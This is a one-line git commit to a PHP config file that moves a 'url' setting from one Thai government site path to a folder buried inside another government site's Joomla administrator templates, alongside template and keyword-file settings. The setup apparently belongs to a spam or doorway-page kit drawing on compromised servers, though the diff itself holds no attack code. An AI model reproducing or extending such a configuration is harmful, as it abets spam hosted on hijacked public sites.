cb552d372bc07c893768bdf8a8788ebe7be8dfc4
ROIHEE <thanawat58311@gmail.com>
2024-09-18 20:32:18 +0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://wws.kkn2.go.th/style/',
+        'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
